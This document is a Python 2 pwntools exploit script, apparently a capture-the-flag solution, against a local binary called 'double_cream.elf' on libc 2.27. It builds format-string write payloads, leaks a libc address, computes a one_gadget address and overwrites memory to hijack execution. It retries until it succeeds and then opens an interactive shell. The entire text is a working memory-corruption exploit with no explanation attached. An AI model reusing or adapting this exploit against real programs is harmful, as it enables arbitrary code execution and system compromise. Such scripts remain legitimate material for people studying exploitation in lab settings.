# libc 2.27

from pwn import *

libc = ELF('./libc.so.6')

def fmt(prev, value, idx, byte=1):
	ln  = "%{}c%{}$ln"
	n   = "%{}c%{}$n"
	hn  = "%{}c%{}$hn"
	hhn = "%{}c%{}$hhn"

	op = {1:hhn, 2:hn, 4:n, 8:ln}
	offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
	if value > prev:
		return op[byte].format(value-prev, idx)
	elif value == prev:
		if byte==1:
			return "%{}$hhn".format(idx)
		elif byte == 2:
			return "%{}$hn".format(idx)
		elif byte == 4:
			return "%{}$n".format(idx)
		elif byte == 8:
			return "%{}$ln".format(idx)
	else:
		return op[byte].format(value-prev+offset[byte], idx)

while True:
	try:
		r = process('./double_cream.elf')

		# round 1
		payload = fmt(0, 0x68, 6) + "%17$p"
		r.sendlineafter(':', payload)
		payload = fmt(0, 0xe6, 12) + fmt(0xe6, 0xa8, 6)
		r.sendlineafter(':', payload)

		r.recvuntil('0x')
		libc_base = int(r.recvn(12), 16)-231-libc.symbols['__libc_start_main']
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[0]
		print "one_shot @ ", hex(one_shot)

		# round 2
		payload = fmt(0, one_shot&0xffff, 12, 2) + fmt(one_shot&0xff, 0xaa, 6)
		r.sendlineafter(':', payload)
		payload = fmt(0, (one_shot>>16)&0xff, 12) + fmt((one_shot>>16)&0xff, 0xa0, 6)
		r.sendlineafter(':', payload)
		break
	except EOFError:
		r.close()
		pass
	except KeyboardInterrupt:
		break

r.interactive()
